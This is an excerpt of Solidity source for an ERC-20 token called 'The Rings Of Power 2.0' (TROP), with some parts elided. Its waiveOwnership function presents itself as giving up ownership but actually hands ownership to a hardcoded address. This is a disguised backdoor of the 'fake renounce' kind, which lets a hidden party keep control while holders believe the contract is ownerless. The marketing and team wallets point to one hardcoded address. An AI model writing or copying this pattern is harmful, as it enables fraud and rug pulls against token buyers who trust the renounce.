...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x94beFb9F15eE939c3A467c16cC970b31B1E9B6a7));
        _owner = address(0x94beFb9F15eE939c3A467c16cC970b31B1E9B6a7);
    }
...
contract TheRingsOfPower is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "The Rings Of Power 2.0";
    string private _symbol = "TROP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5e1D7eA1BCe8eCedFe8f2c9cDaaaF6f600149587);
    address payable public teamWalletAddress = payable(0x5e1D7eA1BCe8eCedFe8f2c9cDaaaF6f600149587);
